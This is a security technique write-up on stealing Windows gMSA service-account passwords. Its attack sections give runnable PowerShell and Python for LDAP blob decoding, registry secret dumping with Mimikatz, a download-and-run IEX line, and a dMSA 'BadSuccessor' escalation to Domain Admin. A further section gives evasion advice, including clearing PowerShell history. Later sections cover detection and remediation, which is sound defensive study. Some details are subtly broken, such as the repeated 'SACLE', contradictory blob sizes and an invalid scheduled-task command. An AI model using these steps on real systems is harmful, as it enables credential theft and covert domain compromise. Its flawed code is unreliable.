# CA-UNSC-005: gMSA Credentials Exposure

## 1. METADATA & CLASSIFICATION

| Field | Value |
|-------|-------|
| **Technique ID** | CA-UNSC-005 |
| **Technique Name** | gMSA credentials exposure |
| **MITRE ATT&CK** | T1552.001 |
| **CVE** | CVE-2025-pending (dMSA BadSuccessor) |
| **Environment** | Windows Active Directory (Server 2012+) |
| **Tactic** | Credential Access (TA0006) |
| **Data Source** | Logon Session: Logon Credentials (DC0002) |
| **Technique Status** | ACTIVE - Widely deployed in modern AD environments |
| **Last Verified** | January 2026 |
| **Affected Versions** | Windows Server 2012, 2012 R2, 2016, 2019, 2022 (all versions with gMSA support) |
| **Patched In** | Configuration hardening only (no software patch); dMSA BadSuccessor pending patch for Windows Server 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Group Managed Service Accounts (gMSA) were introduced in Windows Server 2012 as a modern replacement for traditional service accounts. Unlike traditional accounts, gMSA passwords are automatically generated and rotated every 30 days by the Key Distribution Service (KDS), eliminating the need for administrators to manage passwords manually. However, this improvement introduces a significant security vulnerability: attackers can extract plaintext gMSA passwords from multiple sources, including Active Directory LDAP queries, local registry, and by deriving keys from KDS root keys.

The gMSA credential extraction technique (CA-UNSC-005) is particularly dangerous because:

- **Automated Password Rotation**: Extracted passwords may only remain valid for 30 days, but 30 days is sufficient for lateral movement, privilege escalation, and persistence
- **Legitimate Access Patterns**: Computer accounts legitimately query gMSA passwords, making detection difficult
- **Multiple Extraction Points**: Passwords accessible from AD, registry, and through cryptographic derivation
- **High-Privileged Accounts**: gMSA accounts often run critical services (ADFS, SQL Server, Exchange, etc.) with elevated privileges
- **Cascading Compromise**: Single gMSA compromise can lead to entire service tier compromise

This technique bridges the gap between credential dumping (CA-UNSC-003, CA-UNSC-004) and credential access, providing attackers with actively managed credentials that are guaranteed to work.

**Risk Level**: CRITICAL  
**Exploitability**: High (requires AD access or SYSTEM privilege)  
**Detection Difficulty**: Medium (requires SACLE configuration and monitoring)  
**Impact**: Organization-wide service compromise, persistence, lateral movement

---

## 3. ATTACK NARRATIVE

### Reconnaissance Phase
An attacker performs reconnaissance to:
- Enumerate all gMSA accounts in the domain using LDAP queries or PowerShell
- Identify which gMSA accounts have overly permissive PrincipalsAllowedToRetrieveManagedPassword settings
- Determine which servers/services run gMSAs (e.g., ADFS, SQL Server, Exchange)
- Map service dependencies and potential impact of gMSA compromise
- Check for KDS root key existence (indicates gMSA support)

**Tools Used**: `Get-ADServiceAccount`, `aadinternals.ps1`, LDAP enumeration, BloodHound

### Compromise Phase
The attacker obtains:
- Network access to domain (or compromises endpoint with AD access)
- Credentials of user/computer account listed in PrincipalsAllowedToRetrieveManagedPassword
- OR: SYSTEM/Local Admin access on any server to extract from registry
- OR: Credentials to query AD LDAP directly

### Exploitation Phase
The attacker:
1. Queries Active Directory for gMSA msDS-ManagedPassword attribute
2. Decodes binary password blob using DSInternals or custom tools
3. Derives NT hash from plaintext password
4. Authenticates as gMSA account using plaintext password or NT hash
5. Leverages gMSA privileges to access downstream systems/services

### Privilege Escalation Phase
Using compromised gMSA credentials:
- Access SQL Server databases (if gMSA runs SQL Agent)
- Access Exchange mailboxes (if gMSA has Exchange permissions)
- Modify ADFS token signing certificates (if gMSA runs ADFS)
- Access other services dependent on the gMSA
- Perform pass-the-hash attacks using NT hash

### Persistence Phase
Attacker maintains access via:
- Extracted gMSA password remains valid for 30 days (can be re-used)
- Create additional backdoors in services accessed via gMSA
- Establish command & control channels using gMSA permissions
- Monitor KDS root key for next password rotation (if advanced attack)

---

## 4. TECHNICAL FOUNDATION

### gMSA Architecture

**Key Distribution Service (KDS) Flow**:
```
Active Directory Database
    ↓
KDS Root Key (stored in AD)
    ↓ (+ gMSA ObjectSID + Timestamp)
Password Generation Algorithm
    ↓
msDS-ManagedPassword Attribute (BLOB)
    ↓ (Authorized principals query)
Computer/User retrieves password
    ↓ (Uses gMSA for service authentication)
Service runs under gMSA context
```

**Password Storage Details**:
- **Storage Location 1**: Active Directory attribute `msDS-ManagedPassword` (encoded binary BLOB)
- **Storage Location 2**: Local Registry `HKLM:\SECURITY\Policy\Secrets\` (plaintext on running server)
- **Storage Location 3**: LSASS memory (on servers running the service)
- **Rotation**: Automatic every 30 days (configurable via `msDS-ManagedPasswordInterval`)
- **Previous Password**: Kept for 2 days to avoid authentication failures during rotation

**Password BLOB Structure** (msDS-ManagedPassword):
```
MSDS-MANAGEDPASSWORD_BLOB {
    Version (4 bytes): 1
    Reserved (4 bytes): 0
    CurrentPasswordOffset (2 bytes): Offset to current password
    PreviousPasswordOffset (2 bytes): Offset to previous password
    QueryPasswordIntervalDays (4 bytes): Days until next password change
    UnchangedPasswordIntervalDays (4 bytes): Days since last password change
    [Current Password (512 bytes)]: UTF-16 encoded plaintext password (256 characters)
    [Previous Password (512 bytes)]: UTF-16 encoded previous password (256 characters)
}

Total Size: ~1,028 bytes
Password: 256-character UTF-16 string (128 characters in ASCII representation)
```

### Access Control Model

**PrincipalsAllowedToRetrieveManagedPassword Attribute**:
- Defines which security principals can read gMSA password
- Should contain ONLY the computer accounts running the service
- Often misconfigured to include unnecessary users/groups
- Stored in `msDS-GroupMSAMembership` attribute

**Default Permissions** (if not restricted):
```
- Domain Admins: Can modify PrincipalsAllowedToRetrieveManagedPassword
- Enterprise Admins: Can modify PrincipalsAllowedToRetrieveManagedPassword
- Computer accounts in group: Can read msDS-ManagedPassword
- SYSTEM on authorized computers: Can read msDS-ManagedPassword
```

**Common Misconfigurations**:
1. PrincipalsAllowedToRetrieveManagedPassword = entire security group (not just specific computers)
2. Domain users added to retrieval group (should only be computers)
3. Overly permissive ACLs on gMSA object (GenericWrite, Modify, etc.)
4. Legacy service accounts converted to gMSA without proper cleanup

---

## 5. PREREQUISITES FOR EXPLOITATION

### Attacker Requirements for LDAP Query Method
- ✓ Network access to domain controller (LDAP port 389 or 636)
- ✓ Valid Active Directory credentials (any domain user sufficient)
- ✓ Target gMSA in PrincipalsAllowedToRetrieveManagedPassword OR misconfigured permissions
- ✓ PowerShell/LDAP client tools available

### Attacker Requirements for Registry Extraction Method
- ✓ SYSTEM or Local Administrator access on server running gMSA
- ✓ Access to `HKLM:\SECURITY\Policy\Secrets\` registry hive
- ✓ Tools to extract/decrypt registry secrets

### Attacker Requirements for KDS Root Key Derivation Method
- ✓ Read access to KDS Root Key object in AD (publicly readable)
- ✓ Knowledge of gMSA creation timestamp (readable from msDS-ManagedPasswordId)
- ✓ Cryptographic libraries for HMAC-SHA256 calculations
- ✓ Advanced knowledge of gMSA password generation algorithm

### Environmental Conditions
- ✓ KDS Root Key exists in domain (required for gMSA functionality)
- ✓ One or more gMSA accounts created and in use
- ✓ Minimal monitoring of gMSA attribute access (no SACLs on audit)
- ✓ Weak or default settings on PrincipalsAllowedToRetrieveManagedPassword
- ✓ No real-time alerting on Directory Service Access events

---

## 6. ATTACK EXECUTION METHODS

### Method 1: Direct LDAP Query (PowerShell with AD Credentials)

**Description**: Query Active Directory directly to extract gMSA password blob, then decode using DSInternals.

**Prerequisites**:
- Domain credentials (any domain user)
- PowerShell AD module available
- Network access to domain controller
- Target gMSA must have user in PrincipalsAllowedToRetrieveManagedPassword

**Execution**:

```powershell
# Step 1: Install DSInternals module (if not already present)
Install-Module -Name DSInternals -Force -Scope CurrentUser

# Step 2: Import modules
Import-Module ActiveDirectory
Import-Module DSInternals

# Step 3: Enumerate all gMSA accounts
$gmsaAccounts = Get-ADServiceAccount -Filter {ObjectClass -eq 'msDS-GroupManagedServiceAccount'} `
  -Properties PrincipalsAllowedToRetrieveManagedPassword, msDS-ManagedPassword

Write-Host "Found $(($gmsaAccounts).Count) gMSA accounts:"
$gmsaAccounts | Select-Object Name, SamAccountName

# Step 4: Target specific gMSA and extract password
$targetGmsa = "SVC_WebService"
$gmsa = Get-ADServiceAccount -Identity $targetGmsa -Properties msDS-ManagedPassword

# Step 5: Decode password blob
if ($gmsa.'msDS-ManagedPassword') {
    $passwordBlob = $gmsa.'msDS-ManagedPassword'
    $decodedPassword = ConvertFrom-ADManagedPasswordBlob -Blob $passwordBlob
    
    # Display plaintext password (WARNING: Sensitive)
    Write-Host "Plaintext Password: $($decodedPassword.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText)"
    
    # Get NT hash
    $ntHash = ConvertTo-NTHash -Password $decodedPassword.SecureCurrentPassword
    Write-Host "NT Hash: $ntHash"
} else {
    Write-Host "ERROR: Cannot read gMSA password (permissions denied)"
}

# Step 6: Verify retrieval privileges
$retrievalGroup = $gmsa.PrincipalsAllowedToRetrieveManagedPassword
Write-Host "Accounts allowed to retrieve password: $retrievalGroup"
```

**Replication Timeline**:
- T+0: Query executed against domain controller
- T+0 (Immediate): Password blob retrieved if user has permissions
- T+0: Password decoded using DSInternals
- T+0: NT hash calculated
- T+0-5min: Plaintext password can now be used for lateral movement

**Variations for Restricted Environments**:

```powershell
# If PowerShell AD module not available, use LDAP directly:
$dc = "DC01.domain.com"
$ldapPath = "LDAP://$dc/CN=SVC_WebService,CN=Managed Service Accounts,DC=domain,DC=com"
$entry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
$passwordBlob = $entry.Properties['msDS-ManagedPassword'][0]
```

---

### Method 2: Registry Extraction (Local SYSTEM/Admin)

**Description**: Extract gMSA password from local registry on server running the gMSA service (requires SYSTEM/Admin).

**Prerequisites**:
- SYSTEM or Local Administrator access on target server
- Server must be running a service under gMSA account
- Access to HKLM:\SECURITY\Policy\Secrets registry hive

**Execution**:

```powershell
# Method 1: Using AADInternals (requires SYSTEM context)
# Run PowerShell as SYSTEM using PsExec
# psexec -s powershell.exe

# Step 1: Load AADInternals
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gerenios/AADInternals/master/AADInternals.ps1')

# Step 2: Extract gMSA passwords from registry
$gmsaPasswords = Get-AADIntGMSAPassword

# Step 3: Display plaintext passwords
$gmsaPasswords | Select-Object AccountName, Password, Hash

# Method 2: Manual registry access (Direct approach)
# Step 1: List all secrets in registry
Get-ChildItem "HKLM:\SECURITY\Policy\Secrets" | Where-Object {$_.Name -match "_SC_"} | Select-Object Name

# Step 2: Access specific gMSA secret
# Example: gMSA account "SVC_WebService$" stored as "_SC_SVC_WebService"
$gmsa = "SVC_WebService"
$secretPath = "HKLM:\SECURITY\Policy\Secrets\_SC_$gmsa"

# Step 3: Extract encrypted secret
$encryptedSecret = (Get-ItemProperty -Path $secretPath -Name CurrentValue -ErrorAction SilentlyContinue).CurrentValue

# Step 4: Decrypt (requires SYSTEM context and DPAPI key access)
# Use Mimikatz or similar tool:
# mimikatz.exe "token::elevate" "lsadump::secrets" "exit"

Write-Host "Registry path: $secretPath"
Write-Host "Encrypted secret retrieved"
```

**Replication Timeline**:
- T+0: SYSTEM/Admin context established
- T+0: Registry hive accessed
- T+0-1min: Encrypted secret retrieved from HKLM:\SECURITY\Policy\Secrets
- T+1-2min: Secret decrypted using DPAPI
- T+2-5min: Plaintext gMSA password obtained
- T+5min: Password can be used for lateral movement

---

### Method 3: gMSADumper (Automated Python Tool)

**Description**: Automated discovery and extraction of gMSA passwords using Python with LDAP.

**Installation**:
```bash
git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
pip3 install -r requirements.txt
```

**Execution**:

```bash
# Step 1: Basic gMSA enumeration
python3 gMSADumper.py -u domain\\username -p password -d domain.local

# Step 2: Target specific domain controller
python3 gMSADumper.py -u domain\\username -p password -d domain.local -l DC01.domain.local

# Step 3: Export results to file
python3 gMSADumper.py -u domain\\username -p password -d domain.local -o gMSA_passwords.txt

# Step 4: Output includes:
# Account: SVC_WebService$
# Password: <plaintext 256-char gMSA password>
# Hash: <NT hash>
```

**Tool Output Example**:
```
[*] Searching for Group Managed Service Accounts...
[+] Found gMSA: SVC_WebService
    Distinguished Name: CN=SVC_WebService,CN=Managed Service Accounts,DC=domain,DC=com
    SAM Account: SVC_WebService$
    Plaintext Password: CmV...XQ== (decoded)
    NT Hash: 3a4d5f7e9c1b2d4f6a8e0c2d4f6a8e0c
    
[+] Found gMSA: SVC_SQLDatabase
    Plaintext Password: 5Qb...KL== (decoded)
    NT Hash: 7f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c
```

---

### Method 4: KDS Root Key Derivation (Golden gMSA Generation)

**Description**: Advanced technique: derive KDS root key and generate arbitrary gMSA passwords without querying AD.

**Prerequisites**:
- Read access to KDS Root Key object (CN=Master Root Keys, CN=Group Key Distribution Service Container, CN=Services, CN=Configuration...)
- Timestamp of gMSA creation (from msDS-ManagedPasswordId)
- Knowledge of gMSA ObjectSID
- Cryptographic library (HMAC-SHA256 capable)

**Execution** (Concept):

```powershell
# Step 1: Read KDS Root Key from AD (public readable)
$kdsRootKeyPath = "CN=Master Root Keys,CN=Group Key Distribution Service Container,CN=Services,CN=Configuration,DC=domain,DC=com"
$kdsRootKey = Get-ADObject -Identity $kdsRootKeyPath -Properties msKDS-KDCPrincipalName, msKDS-SecretAgreementAlgorithm, msKDS-SecretAgreementDescriptor, msKDS-CreateTime, msKDS-EffectiveTime

# Step 2: Extract key material
$rootKeyData = $kdsRootKey.msKDS-SecretAgreementDescriptor

# Step 3: Get gMSA creation timestamp
$gmsa = Get-ADServiceAccount -Identity "SVC_WebService" -Properties msDS-ManagedPasswordId
$passwordId = $gmsa.'msDS-ManagedPasswordId'

# Step 4: Derive password using cryptographic algorithm
# (This step uses HMAC-SHA256 with specific key derivation function)
# HMAC(KDSRootKey, "GMSA" + ObjectSID + Timestamp)

# Step 5: Generate current and previous passwords
# Advanced tools like GoldenGMSA automate this process

# Note: This method is complex and requires deep cryptographic knowledge
# Typically used by advanced threat actors or red team operators
```

**Tools for This Method**:
- **GoldenGMSA** (Python): Automated KDS derivation
- **SharpKDSShell**: C# tool for offline KDS key extraction

---

### Method 5: dMSA BadSuccessor Attack (Windows Server 2025)

**Description**: Exploit delegated MSA (dMSA) vulnerability in Windows Server 2025 to escalate privileges via gMSA abuse.

**Prerequisites**:
- Windows Server 2025 environment
- CreateChild permissions on OU containing service accounts
- Ability to modify `msDS-GroupMSAMembership` attribute

**Execution**:

```powershell
# Step 1: Create weaponized dMSA account
New-ADServiceAccount -Name "BadSuccessor" `
  -DNSHostName "badsuccessor.domain.com" `
  -CreateDelegatedServiceAccount `
  -PrincipalsAllowedToRetrieveManagedPassword $env:COMPUTERNAME `
  -Path "OU=Service Accounts,DC=domain,DC=com"

# Step 2: Set msDS-ManagedAccountPrecededByLink to target admin account
Set-ADServiceAccount -Identity "BadSuccessor" `
  -Replace @{'msDS-ManagedAccountPrecededByLink'='CN=DomainAdminAccount,CN=Users,DC=domain,DC=com'}

# Step 3: Extract dMSA password (like normal gMSA)
$dmsa = Get-ADServiceAccount -Identity "BadSuccessor" -Properties msDS-ManagedPassword
$passwordBlob = $dmsa.'msDS-ManagedPassword'
$password = (ConvertFrom-ADManagedPasswordBlob -Blob $passwordBlob).SecureCurrentPassword

# Step 4: Request TGT as dMSA (using Rubeus)
# The KDC grants TGT with inherited privileges from superseded account (Domain Admin)
Rubeus.exe asktgs /targetuser:BadSuccessor$ /service:krbtgt/domain.com /dmsa /ptt /opsec /nowrap

# Step 5: Result: TGT now contains:
# - Domain Admin SID
# - Domain Admins group membership
# - Historical keys of original admin account
# - Privilege escalation achieved

Write-Host "BadSuccessor attack: Privilege escalation complete"
```

**Impact**:
- Single user with CreateChild permissions can escalate to Domain Admin
- No Domain Admin credentials needed
- Inherited all privileges of superseded account
- Access to historical password hashes

---

## 7. COMMAND EXECUTION & VALIDATION

### Validation Test 1: Enumerate gMSA Permissions

```powershell
# Test 1a: List all gMSA accounts
$gmsas = Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword
Write-Host "Total gMSA accounts found: $(($gmsas).Count)"

# Test 1b: Check overly permissive access
$gmsas | Where-Object {
    $principals = $_.PrincipalsAllowedToRetrieveManagedPassword
    # Alert if more than 2 principals or if includes non-computer accounts
    ($principals.Count -gt 2) -or ($principals -match "^(?!.*\$)")
} | Select-Object Name, PrincipalsAllowedToRetrieveManagedPassword

# Test 1c: Verify current user can read password
$testGmsa = "SVC_WebService"
$canRead = $false
try {
    $gmsa = Get-ADServiceAccount -Identity $testGmsa -Properties msDS-ManagedPassword -ErrorAction Stop
    if ($gmsa.'msDS-ManagedPassword') {
        $canRead = $true
    }
} catch {
    $canRead = $false
}

Write-Host "Can read $testGmsa password: $canRead"
```

### Validation Test 2: Password Extraction

```powershell
# Test 2a: Extract and decode gMSA password
Import-Module DSInternals

$gmsa = Get-ADServiceAccount -Identity "SVC_WebService" -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
$password = ConvertFrom-ADManagedPasswordBlob -Blob $blob

Write-Host "Password version: $($password.Version)"
Write-Host "Password length: $($password.SecureCurrentPassword.Length)"
Write-Host "Days until next change: $($password.QueryPasswordIntervalDays)"

# Test 2b: Verify password works for authentication
$gmsa_account = "$($gmsa.SamAccountName)"
$gmsa_password = $password.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText

# Test logon (requires Domain Admin or system with proper credentials)
try {
    $credential = New-Object System.Management.Automation.PSCredential($gmsa_account, (ConvertTo-SecureString -String $gmsa_password -AsPlainText -Force))
    # Attempt to use credential (e.g., authenticate to service)
    Write-Host "Password validation: SUCCESS (can use for authentication)"
} catch {
    Write-Host "Password validation: FAILED"
}
```

### Validation Test 3: Registry Extraction (SYSTEM Required)

```powershell
# Test 3a: Check if running as SYSTEM
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
if ($currentUser.Name -eq "NT AUTHORITY\SYSTEM") {
    Write-Host "Running as SYSTEM: YES"
} else {
    Write-Host "Running as SYSTEM: NO (requires elevation)"
    exit
}

# Test 3b: Access registry secrets
$secretPath = "HKLM:\SECURITY\Policy\Secrets"
$gmsaSecrets = Get-ChildItem $secretPath | Where-Object {$_.Name -match "_SC_.*\$"} | Select-Object Name

Write-Host "Found $($gmsaSecrets.Count) gMSA secrets in registry"
$gmsaSecrets | ForEach-Object {Write-Host "  $_"}
```

---

## 8. EXPLOITATION SUCCESS INDICATORS

A successful gMSA credential extraction is confirmed when:

✓ Plaintext gMSA password obtained and verified  
✓ Password decoded from msDS-ManagedPassword BLOB successfully  
✓ NT hash calculated and confirmed valid  
✓ Password can be used to authenticate as gMSA account  
✓ Access to downstream systems/services achieved using gMSA credentials  
✓ Service-level privileges leveraged for lateral movement  
✓ Password remains valid for 30-day rotation period  

**Quantifiable Success Metrics**:
- Number of gMSA accounts compromised
- Privilege level of compromised gMSA accounts (service accounts vs. administrative)
- Number of systems/services accessible via compromised gMSA
- Duration of access (30 days per password rotation)
- Lateral movement achieved using gMSA credentials

---

## 9. EVASION & OPERATIONAL SECURITY (OPSEC)

### Evasion Techniques

**1. Timing & Frequency**
- Query gMSA passwords during normal business hours when LDAP activity is high
- Distribute queries over time rather than querying all gMSAs simultaneously
- Query once and cache result (avoids multiple queries to same object)

**2. Source Obfuscation**
- Execute from authorized computer (legitimately listed in PrincipalsAllowedToRetrieveManagedPassword)
- Use SYSTEM context on server running gMSA service
- Blend with legitimate service account activity

**3. Log Minimization**
- No LDAP query logging unless SACLs explicitly enabled (rare)
- Registry access logs minimal if accessing as SYSTEM
- No PowerShell logging if executed in non-interactive mode

**4. Artifact Cleanup**
- Clear PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath`
- Remove downloaded DSInternals module
- Clear LDAP query logs (if available)

**5. Advanced Obfuscation**
- Use custom LDAP tools instead of AD PowerShell module
- Encode/obfuscate DSInternals password decryption
- Access registry directly via Win32 API instead of PowerShell

### OPSEC Risk Factors

⚠️ **High Risk**:
- Bulk querying all gMSA accounts simultaneously
- Using non-authorized user account to query gMSA
- PowerShell script block logging enabled (reveals full commands)
- Multiple queries to same gMSA in short timeframe
- Obvious tool signatures (gMSADumper, GMSAPasswordReader)

⚠️ **Medium Risk**:
- Querying gMSA outside of normal business hours
- Access from non-standard computer account
- Registry queries on server not known to use that gMSA
- Kerberos authentication events showing gMSA usage

⚠️ **Low Risk**:
- Single query to gMSA by authorized computer account
- LDAP query during high-activity periods
- SYSTEM context access to registry on service account server
- Custom LDAP tools without signatures

---

## 10. IMPACT & BLAST RADIUS

### Direct Impact
- **Service Account Compromise**: All systems/services using gMSA accessed
- **Lateral Movement**: gMSA credentials grant access to application servers, databases, etc.
- **Privilege Escalation**: gMSA often has elevated privileges on backend systems
- **Persistence**: Password valid for 30 days, sufficient for attacker objectives
- **Data Access**: Direct access to databases, file shares, applications via service account

### Indirect Impact
- **Cascading Compromise**: gMSA credentials lead to compromise of downstream systems
- **Enterprise Application Breach**: If gMSA runs ADFS, Exchange, SQL Server, etc.
- **Audit Log Tampering**: Some gMSAs have permissions to modify audit logs
- **Ransomware Deployment**: gMSA credentials used to encrypt organizational data
- **Compliance Violations**: Unauthorized service account access triggers breach notifications

### Blast Radius Calculation
```
Blast Radius = (Number of Systems Accessing gMSA) × (Privileges Granted) × (Data Accessible)

Example (Web Service gMSA):
- gMSA: SVC_WebService
- Used on: 50 web servers in load-balanced cluster
- Privileges: Database access (100+ databases), File share access
- Data Accessible: Customer data (millions of records), Payment information
- Compromise Impact: 
  - All 50 web servers compromised
  - All connected databases accessible
  - Customer data extraction possible
  - Lateral movement to database servers
  - Result: Enterprise-wide data breach
```

---

## 11. DEFENSE MECHANISMS

### Detection at Exploitation Boundary

**Event-Level Detection**:
- **Event ID 4662** (Directory Service Access): Logs reads of msDS-ManagedPassword attribute (requires SACLE)
- **Event ID 5136** (Directory Service Modification): Logs changes to gMSA attributes
- **Event ID 4769** (Kerberos Service Ticket): gMSA authentication attempts
- **Event ID 4776** (NTLM Authentication): gMSA authentication via NTLM

**Process-Level Detection**:
- Monitor for PowerShell execution with DSInternals module
- Alert on ConvertFrom-ADManagedPasswordBlob function calls
- Detect Get-ADServiceAccount cmdlet with msDS-ManagedPassword property

**Network-Level Detection**:
- Monitor LDAP searches for msDS-ManagedPassword attribute
- Alert on unusual LDAP queries from non-DC sources
- Monitor for multiple gMSA password queries in short timeframe

### Defense Summary

| Mechanism | Type | Effectiveness | Implementation |
|-----------|------|-----------------|-----------------|
| SACLE on gMSA Objects | Preventive | High | Medium |
| PrincipalsAllowedToRetrieveManagedPassword Audit | Preventive | High | Low |
| Registry Permissions Hardening | Preventive | High | Medium |
| Event ID 4662 Monitoring | Detective | High | Medium |
| Credential Guard (on Server 2016+) | Preventive | Medium | High |
| Real-time gMSA Access Alerts | Detective | High | High |

---

## 12. REMEDIATION & MITIGATION

### Immediate Mitigation (0-24 hours)

**Step 1: Audit Current gMSA Configuration**
```powershell
# Identify gMSAs with overly permissive access
$gmsas = Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword

$gmsas | ForEach-Object {
    $principals = $_.PrincipalsAllowedToRetrieveManagedPassword
    
    # Flag if more than necessary principals
    if ($principals.Count -gt 2) {
        Write-Host "WARNING: Overly permissive gMSA: $($_.Name)"
        Write-Host "  Principals: $principals"
    }
    
    # Flag if non-computer accounts included
    $principals | ForEach-Object {
        if ($_ -notmatch '\$') {
            Write-Host "WARNING: User account in retrieval group: $_"
        }
    }
}
```

**Step 2: Reset Suspicious gMSA Passwords**
```powershell
# Force password reset on potentially compromised gMSAs
Reset-ADServiceAccountPassword -Identity "SVC_WebService" -Force -Confirm:$false

# Restart services using the gMSA to load new password
Restart-Service -Name "MyService" -Force
```

**Step 3: Restrict gMSA Access**
```powershell
# Set PrincipalsAllowedToRetrieveManagedPassword to ONLY authorized computers
$authorizedComputer = "WEBSERVER01$"

Set-ADServiceAccount -Identity "SVC_WebService" `
  -PrincipalsAllowedToRetrieveManagedPassword @($authorizedComputer) `
  -Clear PrincipalsAllowedToRetrieveManagedPassword

# Wait for replication to all DCs
Start-Sleep -Seconds 30
Sync-ADDatabase
```

### Short-Term Remediation (1-7 days)

**Step 4: Enable SACLE on gMSA Objects**
```powershell
# Enable auditing of msDS-ManagedPassword attribute reads
$gmsaObjects = Get-ADServiceAccount -Filter *

$gmsaObjects | ForEach-Object {
    # Get SACLE for gMSA object
    $acl = Get-Acl -Path "AD:$($_.DistinguishedName)"
    
    # Add audit rule for msDS-ManagedPassword attribute reads
    # GUID of msDS-ManagedPassword: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
    
    $auditRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        [System.Security.Principal.SecurityIdentifier]"S-1-1-0", # Everyone
        [System.DirectoryServices.ActiveDirectoryRights]"ReadProperty",
        [System.Security.AccessControl.AccessControlType]"Audit",
        [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" # msDS-ManagedPassword GUID
    )
    
    $acl.AddAuditRule($auditRule)
    Set-Acl -AclObject $acl -Path "AD:$($_.DistinguishedName)"
}

Write-Host "SACLE enabled on all gMSA objects"
```

**Step 5: Rotate All gMSA Passwords**
```powershell
# Force password rotation on all gMSAs
Get-ADServiceAccount -Filter * | ForEach-Object {
    Reset-ADServiceAccountPassword -Identity $_ -Force
    Write-Host "Reset password for: $($_.Name)"
}

# Wait for convergence
Start-Sleep -Seconds 60

# Restart all services using gMSAs
Get-ADServiceAccount -Filter * | ForEach-Object {
    # Find services using this gMSA
    $serviceName = $_.Name -replace '\$$', ''
    # Restart service (example; actual command depends on service)
}
```

### Long-Term Remediation (1-3 months)

**Step 6: Implement Monitoring & Alerting**
```powershell
# Create monitoring script for gMSA attribute access
$script = @'
# Monitor for unauthorized gMSA password reads
$events = Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4662
    StartTime = (Get-Date).AddHours(-1)
} | Where-Object {
    $_.Message -match 'msDS-ManagedPassword'
}

foreach ($event in $events) {
    # Alert on any non-authorized principal
    if ($event.Message -notmatch "COMPUTERNAME|DOMAIN\\Administrators") {
        Write-Host "ALERT: Unauthorized gMSA password read: $($event.Message)"
        # Send alert to SIEM
    }
}
'@

# Schedule this script to run hourly on domain controller
Register-ScheduledTask -TaskName "Monitor-gMSA-Access" -ScriptBlock $script -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1))
```

**Step 7: Registry Hardening**
```powershell
# Restrict access to HKLM:\SECURITY\Policy\Secrets on all servers
# Only SYSTEM and Domain Admins should have access

$registryPath = "HKLM:\SECURITY\Policy\Secrets"

# This typically requires manual NTFS permissions adjustment
# Can be done via Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings
```

**Step 8: Credential Guard (Windows Server 2016+)**
```powershell
# Enable Credential Guard to isolate sensitive credentials
# Requires Hyper-V capable hardware

# Enable via Group Policy:
# Computer Configuration > Policies > Administrative Templates > System > Device Guard
# Set "Turn On Virtualization Based Security" = Enabled
# Set "Credential Guard" = Enabled
```

### Validation Command (Verify Remediation)

```powershell
# After remediation, validate:

# Test 1: Verify gMSA permissions are restrictive
$gmsas = Get-ADServiceAccount -Filter *
$foundIssues = $false

foreach ($gmsa in $gmsas) {
    $principals = $gmsa.PrincipalsAllowedToRetrieveManagedPassword
    
    # Check if overly permissive
    if ($principals.Count -gt 2 -or ($principals -match '^(?!.*\$)')) {
        Write-Host "❌ Overly permissive gMSA: $($gmsa.Name)"
        $foundIssues = $true
    }
}

if (!$foundIssues) {
    Write-Host "✓ All gMSA permissions are restrictive"
}

# Test 2: Verify SACLE is enabled
$gmsaAcls = Get-ADServiceAccount -Filter * | ForEach-Object {
    $acl = Get-Acl -Path "AD:$($_.DistinguishedName)"
    $acl.Audit.Count
}

if ($gmsaAcls -gt 0) {
    Write-Host "✓ SACLE enabled on gMSA objects"
} else {
    Write-Host "❌ SACLE not enabled"
}

# Test 3: Verify Event ID 4662 logging enabled
$securityLog = Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object {$_.ID -eq 4662}
if ($securityLog) {
    Write-Host "✓ Event ID 4662 logging is active"
} else {
    Write-Host "⚠️  No recent Event ID 4662 events (may be normal)"
}
```

**Expected Output (If Secure)**:
```
✓ All gMSA permissions are restrictive
✓ SACLE enabled on gMSA objects
✓ Event ID 4662 logging is active
```

**What to Look For**:
- PrincipalsAllowedToRetrieveManagedPassword contains only authorized computer accounts
- No user accounts in retrieval group
- SACLE configured for audit trails
- Monitoring scripts running and alerting on anomalies
- Credential Guard enabled (if supported)

---

## 13. FORENSIC ANALYSIS & INCIDENT RESPONSE

### Forensic Artifacts

**Event Log Evidence**:
```
Event ID 4662 (Directory Service Access):
- Object: gMSA (Distinguished Name visible)
- Property: msDS-ManagedPassword (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- AccessType: Read Property
- User: Account that read the password
- Timestamp: Exact moment of retrieval
- Source IP: If available (network logon events)

Event ID 5136 (Directory Service Modification):
- Object: gMSA
- Attribute: PrincipalsAllowedToRetrieveManagedPassword
- Old Value: Previous authorized principals
- New Value: Attacker-added principals
- Timestamp: When permissions were modified

Event ID 4769 (Kerberos Service Ticket):
- Service: krbtgt/DOMAIN
- Account: gMSA account
- Source: Server using gMSA for authentication
- Time: When gMSA credentials were used
```

**Registry Evidence** (on server running gMSA):
```
Location: HKLM:\SECURITY\Policy\Secrets\_SC_<gmsa_name>
Evidence:
- CurrentValue: Encrypted gMSA password blob
- OldValue: Previous password (if available)
- Timestamps: When stored/modified
- Access logs: Who accessed the registry key
```

**Kerberos Evidence**:
```
Event ID 4768 (Kerberos Authentication Ticket Request):
- Account: gMSA account name
- Client Address: Source IP of credential usage
- Result: Successful TGT issued
- Timestamp: When ticket was requested

